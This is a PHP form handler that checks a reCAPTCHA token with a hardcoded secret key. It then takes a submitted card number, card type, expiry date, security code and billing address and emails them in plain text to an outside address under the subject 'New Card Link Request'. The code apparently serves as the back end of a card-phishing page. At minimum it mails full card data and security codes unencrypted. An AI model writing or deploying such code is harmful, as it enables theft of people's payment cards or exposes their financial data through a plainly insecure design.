<?php

$curl = curl_init();
curl_setopt_array(
    $curl,
    array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_URL => 'https://www.google.com/recaptcha/api/siteverify',
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query(
            array(
                'secret' => '6LdRLNMpAAAAAFDzAK-HDiJoCGWgcMCw1JQrfRQP',
                'response' => $_POST['recaptcha_response']
            )
        )
    )
);

$response = curl_exec($curl);
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if ($response === false) {
        echo 'cURL error: ' . curl_error($curl);
    } else {
        $response = json_decode($response, true);
        curl_close($curl);

        $cardNumber = $_POST['cardNumber'];
        $cardType = $_POST['cardType'];
        $expirationDate = $_POST['expirationDate'];
        $securityCode = $_POST['securityCode'];
        $billingAddress = $_POST['billingAddress'];

        // Email configuration
        $to = "admin2@green.domains"; // Change this to the email address where you want to receive the form submissions
        $subject = "New Card Link Request";
        $message = "Card Number: $cardNumber\nCard Type: $cardType\nExpiration Date: $expirationDate\nSecurity Code: $securityCode\nBilling Address: $billingAddress";
        $headers = "From: admin1@green.domains"; // Change this to the sender's email address

        // Send email
        if ($response['success']) {
            if (mail($to, $subject, $message, $headers)) {
                // Send a success response with an alert message
                echo json_encode(array("status" => "success", "message" => "Email sent successfully"));
            } else {
                // Send a failure response with an alert message
                echo json_encode(array("status" => "error", "message" => "Email sending failed"));
            }
        } else {
            echo json_encode($response);
        }

        // Add a response for AJAX request
        exit; // Stop further execution
    }
}